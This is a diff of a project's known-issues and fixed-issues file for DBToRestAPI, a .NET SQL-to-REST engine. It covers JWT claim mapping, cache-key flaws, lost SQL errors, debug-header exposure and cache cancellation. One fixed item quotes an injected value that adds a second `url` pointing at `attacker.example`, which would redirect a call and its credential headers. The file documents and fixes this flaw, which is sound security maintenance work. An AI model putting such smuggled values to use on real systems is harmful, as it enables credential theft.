@@ -14,12 +14,6 @@ names the note that explains the background.
 The items below were found on 2026-10-06 while testing the docs with docs-only agents graded
 against the code. Each was read in the code; none has a test yet.
 
-- **`{auth{sub}}` is documented everywhere but not filled.** The default `JwtSecurityTokenHandler`
-  (Step4JwtAuthorization.cs, token validation) renames `sub` to the name-identifier URI, so the
-  claims dictionary has `user_id` but no `sub`. Claims merged from the UserInfo endpoint are
-  stored as `JsonElement` values (`GetUserInfoAsync` deserialises into `Dictionary<string, object>`),
-  which SQL drivers can't bind, so a query using one fails with the generic 400. Fix both in the
-  engine, then remove the "use `{auth{user_id}}`" caveats from the docs.
 - **Custom SQL errors don't map on every database** (ApiController.cs, `TryGetCustomDbError`):
   - PostgreSQL messages keep the `P0001:` SQLSTATE prefix (use `MessageText`).
   - Oracle expects a negative `Number`, but ODP.NET reports a positive one.
@@ -51,13 +45,28 @@ against the code. Each was read in the code; none has a test yet.
 - **OpenAPI:** upload endpoints have no request schema, and the default error schema
   (`error_message`) doesn't match the runtime body (`success`, `message`, `error_number`).
 - **The shipped `settings.xml` sets `debug_mode_header_value` to 54321.** Anyone sending that header
-  gets stack traces. Ship the sample without the element. Don't ship it empty: `IsDebugMode`
-  (SettingsService.cs) compares header and setting as strings, so an empty value matches an empty
-  `debug-mode` header. Treat an empty configured value as "off".
+  gets stack traces. Ship the sample without the element (an empty value is "off" from 1.7.6).
 - **An error raised after the first result set is lost.** Com.H.Data.Common reads only the first
   result set and never calls `NextResult`, so on SQL Server and SQLite `SELECT ...; THROW 50404 ...`
-  returns a success and keeps the uploads. Consider draining the remaining results after reading,
-  so trailing errors surface. Documented as a rule for now.
+  returns a success and keeps the uploads. Fixed in Com.H.Data.Common 10.1.0.10, which moves through
+  the remaining result sets once the caller has read every row. Bumping the reference is not enough
+  on its own (found by review on 2026-10-06):
+  - `array` (without cache), `auto` with two or more rows, and a count_query's main query enumerate
+    while MVC writes the response, after `ApiController.Index` has returned. The error then reaches
+    Step6, which answers 500 "An unexpected error occurred", or the client sees a 200 cut off
+    mid-body if the response has started. Map it in Step6 with `TryGetCustomDbError` when the
+    response hasn't started, and read the first rows inside the controller, as `auto` does.
+  - `single`, file downloads and the count query stop after the first row, so they never reach
+    the drain and still lose the error. Read them to the end before closing the reader.
+  - 10.1.0.10 also returns a single unnamed column as one bare value per row, instead of the value
+    plus an object with an empty key. The engine's chain then takes a one-row intermediate result
+    as a column source: its value is parsed as JSON, so an unaliased `SELECT (... FOR JSON PATH,
+    WITHOUT_ARRAY_WRAPPER)` would feed its keys into the next query's `{{name}}` ahead of request
+    values. Use a single row as a column source only when it is an object, and add an engine test.
+    Response shapes change too: an `auto` response of an unaliased `COUNT(*)` becomes the bare
+    value instead of `[2,{"":2}]`, and `{pq{json}}` of such a query becomes `[v]`. Say so in the
+    release notes.
+  Keep AGENTS.md rule 2 ("raise before rows") until all of this is done, and add engine tests.
 - **Configuration reload, reported by review and not yet reproduced end to end:**
   - The route resolvers and `SettingsEncryptionService` subscribe to the same root reload token. On
     alternate reloads the resolvers may rebuild from the previous merged snapshot.
@@ -71,15 +80,9 @@ against the code. Each was read in the code; none has a test yet.
   instead, and IIS's `maxAllowedContentLength` before it. The engine could set
   `IISServerOptions.MaxRequestBodySize` from the same setting. `maxAllowedContentLength` still
   needs a `web.config`.
-- **`required_scopes` fails for tokens that carry `scp`** (Entra ID, Okta). Step4JwtAuthorization
-  reads `FindAll("scp")` and `FindAll("scope")`, but .NET has renamed `scp` to
-  `http://schemas.microsoft.com/identity/claims/scope`, so such tokens never satisfy the check
-  and get 403. Read the mapped type too, or turn off inbound claim mapping and adapt the
-  `email`/`roles` look-ups.
-- **`{auth{user_id}}` never falls back to `oid`.** The code tries NameIdentifier, then `sub`, then
-  `oid`, but .NET has renamed `oid` to the objectidentifier claim type, so the last step never
-  matches. A provider that sends a constant subject ("Not supported") gives every user the same
-  id. Read the mapped objectidentifier claim, and ignore a "Not supported" subject.
+- **A constant subject gives every user the same `user_id`.** An Azure AD B2C user flow with the
+  subject claim turned off sends `Not supported`. Ignore that value and fall back to `oid` (the
+  fallback to the renamed `oid` itself works from 1.7.6).
 - **Only the config files listed in `DBToRestAPI.csproj` are copied to the build output.** A new
   `config/*.xml` file named in `<additional_configurations>` makes `dotnet run` fail at start-up
   until it gets its own csproj entry. Consider a `config\*.xml` glob.
@@ -88,19 +91,20 @@ against the code. Each was read in the code; none has a test yet.
   `Content-Disposition` on downloads.
 The items below were found on 2026-10-06 by checking real-world usage patterns against the code.
 
-- **The cache key of a database route is only the element name plus the `<invalidators>` values**
-  (CacheService.cs). It has no verb, route values, query string or caller. A cached route that
-  answers several verbs serves a cached GET answer to a write, so the write never runs. A route
-  value missing from `<invalidators>` shares one entry across all ids. Invalidator values are
-  read from every parameter source, so one named like a `<vars>` key or a JWT claim takes that
-  value. The key uses `section.Key`, which is `0`, `1`... for duplicate sibling endpoints. Add the
-  method, the resolved route and `section.Path` to the key, and warn at load about cached routes
-  with several verbs or route values missing from `<invalidators>`.
-- **Raw markers in `{http{}}` blocks can take request values.** A marker outside a JSON string
-  (`"body": {{body}}`) is meant for a chained value. But when that column is `NULL`, or the
-  previous query returned no row or several, a request field with the same name is inserted as
-  raw JSON. It can add a second `"url"` and send the block's credential headers to another host.
-  Accept only `{pq{}}` and `{s{}}` values there, or require exactly one JSON value.
+- **A caller waiting on another caller's cache fill gets a 400 when that caller disconnects.**
+  HybridCache runs one fill per key and every caller with the same key waits on it, but the fill
+  uses the first caller's `RequestAborted` (and, for a query endpoint, a connection registered for
+  disposal on the first caller's response). When that caller leaves, the fill fails and every
+  waiting caller gets the generic 400. Fix it by giving the fill HybridCache's own `cancel` token
+  (cancelled only when every caller has gone) plus the route's timeout, and by disposing the
+  connection inside the factory in materialised mode. Don't catch OperationCanceledException in
+  the callers instead: a 1.7.6 attempt did, and also caught upstream timeouts, so every waiting
+  caller re-sent its request to an upstream that was already too slow. Found by review on
+  2026-10-06.
+- **Cache invalidators are read from every parameter source** (CacheService.cs), so one named like
+  a `<vars>` key or a JWT claim takes that value. Also consider a start-up warning for a cached
+  route whose answer looks caller-specific (it uses `{auth{...}}` without naming the caller in
+  `<invalidators>`).
 - **`{http{}}` matching ignores SQL comments.** A complete marker in a comment makes a real call.
   An unclosed one pairs with the next block's `}http}`, and the SQL in between is deleted.
 - **JSON numbers are bound as `double`** (Com.H.Data.Common `DataExtensions`). On SQL Server, a
@@ -110,9 +114,6 @@ The items below were found on 2026-10-06 by checking real-world usage patterns a
   - an element name repeated across files merges both endpoints silently;
   - a repeated verb + route resolves to the first match silently;
   - unknown tags (for example `<cache_duration_seconds>`) are ignored.
-- **`given_name` and `family_name` are renamed by .NET's claim mapping**, so the UserInfo fallback's
-  check never finds them and every new token triggers a UserInfo request. `{auth{given_name}}`
-  is never filled from the token itself.
 - **Regex override keys are read inconsistently.** The shipped `regex.xml` sets
   `regex:query_string_variables_pattern`, `regex:route_variables_pattern` and
   `regex:form_variables_pattern`, which the code never reads.
@@ -137,6 +138,52 @@ The items below were found on 2026-10-06 by checking real-world usage patterns a
   bundled in release archives.
 
 ## Done
+
+- **A write to a cached endpoint was answered from the cache.** Fixed in 1.7.6. The key of a
+  cached database endpoint was only its element name plus the `<invalidators>` values. An endpoint
+  with no `<verb>` answers every verb, so a POST, PUT or DELETE got the cached GET response and its
+  SQL never ran, while the caller saw a success. A route value missing from `<invalidators>`
+  shared one entry across all ids. Now only GET and HEAD read or write the cache, on database
+  endpoints and on API gateway routes (whose key never held the request body), and the key is the
+  endpoint's configuration path, the verb, the hashed route values and the invalidators (the
+  values, not the raw path, so `Items//1` and `items/1` share an entry). The gateway route is
+  hashed in its key too, so a path carrying `|` or `=` can't build another request's key, and a
+  repeated query value (`?tag=a&tag=b`) no longer shares the entry of `?tag=a,b`. Each invalidator
+  value is labelled with its source, so `?category=toys` sent with a `category: books` header can't
+  fill the books entry, and gateway query-string names keep their spelling. A gateway
+  response whose status is in `exclude_status_codes_from_cache` used to be stored as an empty
+  entry, so later requests got an empty 200 without being forwarded; it is no longer stored.
+  See [CacheVerbAndRouteTests.cs](DBToRestAPI.Tests/CacheVerbAndRouteTests.cs).
+
+- **A raw marker in an `{http{}}` block could take a request value and redirect the call.** Fixed in
+  1.7.6. A marker outside a JSON string (`"body": {{payload}}`) was inserted as raw text. When a
+  chained query's column was `NULL` (or it returned no row or several), a request field with the
+  same name filled it, so `1, "url": "https://attacker.example"` added a second `url`, and the
+  call went there with the block's credential headers. Now such a value must be exactly one JSON
+  value (read as leniently as the block: comments and trailing commas allowed) and is inserted as
+  compact JSON, or it is inserted as a JSON string. Booleans become `true`/`false` (their .NET text,
+  `True`, was invalid JSON) and numbers use the invariant culture. Markers are found with the
+  patterns the route actually uses, so an overridden delimiter such as `||id||` inside a string is
+  escaped too. A marker used both inside and outside a string, in a comment, or brought in by an
+  earlier value is escaped so it can't change the structure anywhere. See
+  [EmbeddedHttpTemplateTests.cs](DBToRestAPI.Tests/HttpExecutor/EmbeddedHttpTemplateTests.cs).
+
+- **Renamed token claims were missing, and `required_scopes` rejected `scp` tokens.** Fixed in
+  1.7.6. .NET renames `sub`, `scp`, `oid`, `tid`, `given_name`, `family_name` and others on the way
+  in. So `{auth{sub}}` and the other short names were empty, `required_scopes` gave every Entra ID
+  or Okta token a 403, `user_id` never fell back to `oid`, and the UserInfo fallback ran for every
+  new token because it looked for `given_name` under its short name only. The UserInfo values it
+  added were `JsonElement`s that no SQL driver binds, so a query using one failed with the generic
+  400. Now every claim is exposed under its .NET type and the name the token used, look-ups match
+  either name, UserInfo values are text and never replace a claim the token has, and `user_id`,
+  email, name, roles and scopes are read from the token before the UserInfo merge (so a B2C
+  token's `emails` beats a UserInfo `email`). `{auth{scp}}` and `{auth{scope}}` hold every scope,
+  space-separated, also when Okta sends them as an array. See
+  [Step4ClaimNamesTests.cs](DBToRestAPI.Tests/Step4ClaimNamesTests.cs).
+
+- **An empty `debug_mode_header_value` turned debug mode on for an empty header.** Fixed in 1.7.6.
+  A missing or blank setting now means debug mode is off, and the header must match exactly. See
+  [DebugModeTests.cs](DBToRestAPI.Tests/DebugModeTests.cs).
 
 - **A caller could set the fields an upload entry gets from the engine.** Fixed in 1.7.5. A caller
   could hand the query a files array of their own, marked `is_new_upload` and pointing at any file
